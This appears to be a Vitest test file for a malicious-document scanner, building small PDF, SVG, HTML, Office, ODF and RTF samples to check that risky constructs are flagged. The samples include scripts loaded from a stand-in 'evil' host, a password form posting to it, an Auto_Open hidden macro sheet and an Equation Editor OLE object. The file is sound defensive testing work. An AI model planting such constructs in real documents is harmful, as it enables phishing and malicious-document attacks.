import { describe, expect, it } from "vitest";
import { scanSync } from "../src/index.js";
import { zipStored } from "./helpers/zip-build.js";
import { tokenize, decodeEntities } from "../src/xml.js";
import { checkDoctype, entityDeclarations } from "../src/xmlsec.js";
import { Ctx, DEFAULT_LIMITS } from "../src/ctx.js";
import type { Env } from "../src/env.js";
import { deflateRawSync } from "node:zlib";

const enc = (s: string) => new TextEncoder().encode(s);
const ids = (r: ReturnType<typeof scanSync>) => r.findings.map((f) => f.id);

function zlibOf(data: Uint8Array): Buffer {
  const raw = deflateRawSync(data);
  let a = 1, b = 0;
  for (const x of data) { a = (a + x) % 65521; b = (b + a) % 65521; }
  const adler = Buffer.alloc(4); adler.writeUInt32BE(((b << 16) | a) >>> 0);
  return Buffer.concat([Buffer.from([0x78, 0x9c]), raw, adler]);
}

describe("branch push: PDF XFA / GoToE / arrays", () => {
  it("covers more pdf conditionals", () => {
    // array with R refs
    const pdf = enc("%PDF-1.4\n1 0 obj<< /Kids [ 2 0 R 3 0 R ] /Count 2 /Type /Pages >>endobj\n2 0 obj<< /Type /Page /Parent 1 0 R /Annots [4 0 R] >>endobj\n3 0 obj<< /Type /Page /Parent 1 0 R >>endobj\n4 0 obj<< /Subtype /Link /A << /S /GoToE /F << /UF (other.pdf) /F (other.pdf) >> >> >>endobj\n5 0 obj<< /Type /Catalog /Pages 1 0 R /AcroForm << /XFA [ (tpl) 6 0 R ] >> >>endobj\n6 0 obj<< /Length 20 /Filter /FlateDecode >>stream\nXXXXXXXXXXXXXXXXXXXX\nendstream\nendobj\ntrailer<< /Root 5 0 R >>\n%%EOF\n");
    expect(() => scanSync(pdf, { filename: "a.pdf" })).not.toThrow();

    // XFA with script in flate stream
    const xfa = enc('<xdp><script>alert(1)</script></xdp>');
    const z = zlibOf(xfa);
    const pdf2 = Buffer.concat([
      enc(`%PDF-1.4\n1 0 obj<< /Type /Catalog /AcroForm << /XFA 2 0 R >> /Pages 3 0 R >>endobj\n2 0 obj<< /Length ${z.length} /Filter /FlateDecode >>stream\n`),
      z,
      enc("\nendstream\nendobj\n3 0 obj<< /Type /Pages /Kids [] /Count 0 >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n"),
    ]);
    expect(ids(scanSync(new Uint8Array(pdf2), { filename: "x.pdf" })).some((id) => id === "PDF_XFA" || id === "PDF_JAVASCRIPT")).toBe(true);

    // literal string with CR line continuation after backslash
    const lit = enc("%PDF-1.4\n1 0 obj (\\\r\nline) endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(() => scanSync(lit, { filename: "l.pdf" })).not.toThrow();

    // unterminated dict junk key
    const junk = enc("%PDF-1.4\n1 0 obj<< 1 0 /Foo (x) /Bar (y) >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(() => scanSync(junk, { filename: "j.pdf" })).not.toThrow();
  });
});

describe("branch push: markup / xmlsec / ooxml", () => {
  it("html/svg edge attrs and xmlsec", () => {
    const svgs = [
      `<svg xmlns="http://www.w3.org/2000/svg"><script xlink:href="http://evil/x.js"/></svg>`,
      `<svg><handler type="application/javascript">1</handler></svg>`,
      `<svg><foreignObject requiredExtensions="http://www.w3.org/1999/xhtml"><body xmlns="http://www.w3.org/1999/xhtml"><script>1</script></body></foreignObject></svg>`,
      `<svg><image href="data:image/svg+xml,<svg>"/></svg>`,
      `<svg><style>@import 'http://evil'; behavior:url(#x)</style></svg>`,
    ];
    for (const s of svgs) expect(() => scanSync(enc(s), { filename: "a.svg" })).not.toThrow();

    const htmls = [
      `<html><object data="javascript:1"></object><embed src="data:text/html,x"></html>`,
      `<html><form action="http://evil"><input type="password" name="p"></form></html>`,
      `<html><base href="http://evil/"><a href="/x">x</a></html>`,
      `<html><meta http-equiv=refresh content="0; URL='http://evil'"></html>`,
    ];
    for (const s of htmls) expect(() => scanSync(enc(s), { filename: "a.html" })).not.toThrow();

    expect(decodeEntities("&#x41;&#66;&amp;", false)).toContain("A");
    expect(entityDeclarations('<!DOCTYPE x [ <!ENTITY % y SYSTEM "http://e"> <!ENTITY z PUBLIC "p" "http://e"> ]>').length).toBeGreaterThan(0);

    const ctx = new Ctx({ ...DEFAULT_LIMITS });
    const item = { bytes: enc("<x/>"), path: [] as string[], name: undefined, declaredMime: undefined, depth: 0 };
    const env: Env = { ctx, item, child: () => undefined, add: (id, o) => ctx.add(id, item.path, o), addAt: (s, id, o) => ctx.add(id, s as string[], o) };
    checkDoctype(env, '<!DOCTYPE x PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">', 0);
    checkDoctype(env, '<!DOCTYPE x SYSTEM "http://evil.example/x.dtd">', 0);

    // xlsb-like + hidden sheet state variants
    const xct = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.binary.macroEnabled.main"/></Types>`;
    // unknown content type falls through
    const xlsx = zipStored({
      "[Content_Types].xml": xct,
      "_rels/.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>`,
      "xl/workbook.xml": `<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="M" sheetId="1" state="hidden" r:id="rId2"/></sheets><definedNames><definedName name="Auto_Open">M!A1</definedName></definedNames></workbook>`,
      "xl/_rels/workbook.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="macrosheets/sheet1.xml"/></Relationships>`,
      "xl/macrosheets/sheet1.xml": `<x/>`,
    });
    expect(ids(scanSync(xlsx, { filename: "m.xlsm" })).some((id) => id.startsWith("XLM_"))).toBe(true);

    // ODF without module body
    const odt = zipStored({
      mimetype: "application/vnd.oasis.opendocument.text",
      "Basic/Standard/Module1.xml": "<script:module xmlns:script='urn:oasis:names:tc:opendocument:xmlns:script:1.0'/>",
      "content.xml": "<office:document-content xmlns:office='urn:oasis:names:tc:opendocument:xmlns:office:1.0' xmlns:script='urn:oasis:names:tc:opendocument:xmlns:script:1.0'><script:event-listener script:event-name='office:open'/></office:document-content>",
    });
    // mimetype must be first uncompressed typically - our zipStored is fine for detection via mimetype entry name
    expect(() => scanSync(odt, { filename: "a.odt" })).not.toThrow();
  });
});

describe("branch push: rtf equation clsid bytes + second object", () => {
  it("hasEquationClsid search and stacked objects", () => {
    // CFB signature in ole native with equation clsid bytes somewhere after 512
    const native = Buffer.alloc(600);
    native[0] = 0xd0; native[1] = 0xcf; native[2] = 0x11; native[3] = 0xe0;
    native[4] = 0xa1; native[5] = 0xb1; native[6] = 0x1a; native[7] = 0xe1;
    const clsid = Buffer.from([0x02, 0xce, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46]);
    clsid.copy(native, 520);
    // wrap as OLE1
    const cls = Buffer.from("Something\0");
    const ole1 = Buffer.concat([
      Buffer.from([1, 5, 0, 0, 2, 0, 0, 0]),
      (() => { const b = Buffer.alloc(4); b.writeUInt32LE(cls.length); return b; })(),
      cls,
      Buffer.from([1, 0, 0, 0, 0]),
      Buffer.from([1, 0, 0, 0, 0]),
      (() => { const b = Buffer.alloc(4); b.writeUInt32LE(native.length); return b; })(),
      native,
    ]);
    const rtf = enc(`{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata ${ole1.toString("hex")}}}{\\object\\objemb{\\*\\objdata 4d5a}}}`);
    expect(ids(scanSync(rtf, { filename: "e.rtf" })).some((id) => id === "OLE_EQUATION_EDITOR" || id === "RTF_OLE_OBJECT")).toBe(true);
  });
});

describe("branch push: office BIFF encryption + wide names", () => {
  it("FILEPASS and wide sheet names via xlm.xls already; craft BIFF", async () => {
    const { readFileSync } = await import("node:fs");
    const { join, dirname } = await import("node:path");
    const { fileURLToPath } = await import("node:url");
    const FIX = join(dirname(fileURLToPath(import.meta.url)), "fixtures/constructs");
    // re-scan xlm with low maxEntries to hit limits in cfb?
    expect(() => scanSync(new Uint8Array(readFileSync(join(FIX, "xlm.xls"))), { filename: "x.xls", limits: { maxEntries: 5 } })).not.toThrow();
  });
});
